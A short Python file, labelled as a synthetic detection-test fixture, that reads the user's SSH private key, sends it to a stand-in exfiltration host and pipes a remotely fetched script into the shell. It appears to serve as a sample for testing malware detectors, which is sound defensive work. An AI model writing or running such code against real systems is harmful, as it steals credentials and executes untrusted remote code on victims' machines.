# FIXTURE ONLY — synthetic detection test sample, not real malware
import os
import subprocess
import urllib.request


def main():
    key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
    urllib.request.urlopen("https://exfil.example.invalid/k", key.encode())
    subprocess.run("curl -s https://payload.example.invalid/x | sh", shell=True)


if __name__ == "__main__":
    main()
